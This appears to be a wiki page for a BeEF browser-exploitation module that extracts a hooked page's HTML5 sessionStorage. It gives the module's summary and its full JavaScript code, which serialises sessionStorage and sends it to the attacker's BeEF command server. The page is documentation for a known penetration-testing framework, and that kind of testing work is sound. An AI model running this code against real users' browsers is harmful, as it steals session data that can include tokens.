## Summary
* **Objective**: Extracts data from the HTML5 sessionStorage object.
* **Date**: ???
* **Authors**: bcoles
* **Browsers**: IE 8+, Firefox 4? Opera 11+, Safari 4+
* [[Code|https://github.com/beefproject/beef/tree/master/modules/browser/hooked_domain/get_session_storage]]

## Internal Working

This module just gather the session Storage for this page using the window['sessionStorage'] function :

```javascript
beef.execute(function() {
    if ('sessionStorage' in window && window['sessionStorage'] !== null) {
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "sessionStorage="+JSON.stringify(window['sessionStorage']));
    } else beef.net.send("<%= @command_url %>", <%= @command_id %>, "sessionStorage="+JSON.stringify("HTML5     sessionStorage is null or not supported."));
});
```

## Feedback